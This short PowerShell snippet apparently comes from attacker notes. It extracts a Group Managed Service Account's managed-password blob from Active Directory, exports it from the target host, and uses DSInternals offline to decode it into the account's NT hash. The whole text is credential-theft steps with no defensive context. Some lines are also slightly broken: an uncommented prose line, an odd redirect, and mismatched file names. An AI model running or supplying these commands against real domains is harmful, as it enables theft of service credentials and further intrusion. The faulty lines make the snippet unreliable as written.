# Save the blob to a variable
$gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

Export the $mp variable off the target box
$mp = $gmsa.'msDS-ManagedPassword' > c:\temp\mp_text

On a "Offline Windows Box(With DSInternals installed and module loaded):
$content = Get-Content "mp_text.txt"
ConvertFrom-ADManagedPasswordBlob $content
(ConvertFrom-ADManagedPasswordBlob $content).SecureCurrentPassword | ConvertTo-NTHash
